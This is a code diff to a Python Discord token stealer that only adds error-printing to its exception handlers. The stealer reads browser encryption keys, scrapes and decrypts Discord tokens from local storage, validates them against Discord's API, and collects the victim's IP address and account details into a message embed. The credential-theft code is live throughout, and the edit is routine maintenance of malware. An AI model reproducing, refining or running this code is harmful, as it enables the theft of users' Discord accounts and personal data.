@@ -6,7 +6,6 @@ from Crypto.Cipher import AES
 from datetime import datetime
 from re import findall
 from urllib.request import Request, urlopen
-from subprocess import Popen, PIPE
 
 tokens = []
 cleaned = []
@@ -14,15 +13,16 @@ cleaned = []
 def decrypt(buff, master_key):
     try:
         return AES.new(CryptUnprotectData(master_key, None, None, None, 0)[1], AES.MODE_GCM, buff[3:15]).decrypt(buff[15:])[:-16].decode()
-    except:
+    except Exception as e:
+        print(f"Error decrypting token: {e}")
         return "Error"
 
 def getip():
     ip = "None"
     try:
         ip = urlopen(Request("https://api.ipify.org")).read().decode().strip()
-    except:
-        pass
+    except Exception as e:
+        print(f"Error fetching IP address: {e}")
     return ip
 
 def get_token():
@@ -39,7 +39,8 @@ def get_token():
         try:
             with open(os.path.join(path, "Local State"), "r") as file:
                 key = json.loads(file.read())['os_crypt']['encrypted_key']
-        except:
+        except Exception as e:
+            print(f"Error reading key file: {e}")
             continue
         
         for file_name in os.listdir(os.path.join(path, "Local Storage", "leveldb")):
@@ -52,7 +53,8 @@ def get_token():
                         line.strip()
                         for token_value in findall(r"dQw4w9WgXcQ:[^.*\['(.*)'\].*$][^\"]*", line):
                             tokens.append(token_value)
-            except PermissionError:
+            except PermissionError as e:
+                print(f"Permission error: {e}")
                 continue
         
         for token in tokens:
@@ -64,13 +66,15 @@ def get_token():
         for token in cleaned:
             try:
                 tok = decrypt(b64decode(token.split('dQw4w9WgXcQ:')[1]), b64decode(key)[5:])
-            except IndexError:
+            except IndexError as e:
+                print(f"Index error: {e}")
                 continue
             
             headers = {'Authorization': tok, 'Content-Type': 'application/json'}
             try:
                 res = requests.get('https://discordapp.com/api/v6/users/@me', headers=headers)
-            except:
+            except Exception as e:
+                print(f"Failed to get user data: {e}")
                 continue
             
             if res.status_code == 200:
@@ -94,7 +98,8 @@ def get_token():
                         d1 = datetime.strptime(nitro_data[0]["current_period_end"].split('.')[0], "%Y-%m-%dT%H:%M:%S")
                         d2 = datetime.strptime(nitro_data[0]["current_period_start"].split('.')[0], "%Y-%m-%dT%H:%M:%S")
                         days_left = abs((d2 - d1).days)
-                except:
+                except Exception as e:
+                    print(f"Failed to get nitro data: {e}")
                     pass
 
                 embed = f"""**{user_name}** *({user_id})*\n
